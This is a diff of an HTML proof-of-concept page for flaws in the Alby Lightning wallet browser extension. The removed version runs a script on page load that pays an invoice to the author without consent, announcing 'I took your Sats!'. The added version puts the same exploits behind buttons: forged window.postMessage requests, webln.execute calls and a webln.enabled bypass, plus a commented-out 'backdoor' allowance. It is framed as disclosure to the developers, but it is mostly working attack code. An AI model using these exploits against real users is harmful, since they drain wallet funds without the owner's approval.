@@ -1,36 +1,71 @@
-<title>Your Sats are gone!</title>
-<script>
-  async function sendFreeSats() {
-    const zbdData = await fetch("https://api.zebedee.io/v0/process-static-charges/8755f68e-54a4-497c-a50b-ce07c8270b88?amount=1000");
-    const actualInvoice = (await zbdData.json()).pr;
-    window.postMessage(
-     {
-        application: "LBE",
-        prompt: true,
-        type: "sendPayment",
-        args: {
-          paymentRequest: actualInvoice
-        },
-      },
-      "*"
-    );
-    await window.webln.execute("sendPayment", {
-      paymentRequest: actualInvoice
-    });
-    window.postMessage(
-     {
-        application: "LBE",
-        prompt: true,
-        action: "sendPayment",
-        type: "enable",
-        args: {
-          paymentRequest: actualInvoice
-        },
-      },
-      "*"
-    );
-  }
-  sendFreeSats();
-</script>
-<h1>I took your Sats!</h1>
-This is a demo site for an Alby vulnerability which sends me 1-4 sats (because it uses different ways of exploiting a vulnerability for testing purposes) on every reload. Let me know if you want me to send it back.
+<!doctype html>
+<html>
+  <head>
+    <link rel="stylesheet" href="https://unpkg.com/@picocss/pico@latest/css/pico.min.css">
+    <title>Alby security PoC</title>
+    <script>
+      async function getInvoice(amount) {
+        const zbdData = await fetch(`https://api.zebedee.io/v0/process-static-charges/8755f68e-54a4-497c-a50b-ce07c8270b88?amount=${amount}`);
+        return (await zbdData.json()).pr;
+      }
+
+      async function sendUsingWebLnExec() {
+        await window.webln.execute("sendPayment", {
+          paymentRequest: await getInvoice(1000);
+        });
+      }
+      
+      async function sendUsingPostMsg170() {
+        window.postMessage(
+         {
+            application: "LBE",
+            prompt: true,
+            type: "sendPayment",
+            args: {
+              paymentRequest: await getInvoice(1000),
+            },
+          },
+          "*"
+        );
+      }
+
+      async function sendUsingPostMsg180() {
+        window.postMessage(
+         {
+            application: "LBE",
+            prompt: true,
+            action: "sendPayment",
+            type: "enable",
+            args: {
+              paymentRequest: await getInvoice(1000),
+            },
+          },
+          "*"
+        );
+      }
+
+      async function bypassEnableSend() {
+        window.webln.enabled = true;
+        await window.webln.sendPayment(await getInvoice(1000));
+      }
+    </script>
+  </head>
+  <body>
+  <main class="container">
+    <h1>Alby vulnerabilities PoC</h1>
+    This page demonstrates a few ways to bypass <a href="https://getalby.com">Alby</a>'s security features.
+    The development team is informed and these issues will be fixed soon.
+    <section class="container">
+      <h3>Alby 1.7.0 and below</h3>
+      <button onclick="sendUsingWebLnExec();">Send using webln.execute()</button>
+      <button onclick="sendUsingPostMsg170();">Send using window.postMessage()</button>
+    </section>
+    <section class="container">
+      <h3>Alby 1.8.0 and below</h3>
+      <button onclick="sendUsingPostMsg180();">Send using window.postMessage() and bypassing security check</button>
+      <button onclick="bypassEnableSend();">Ask for payment without calling webLn.enable</button>
+      <!--<button onclick="setupBackdoor();">Place a "backdoor" allowance</button>-->
+    </section>
+  </main>
+  </body>
+</html>
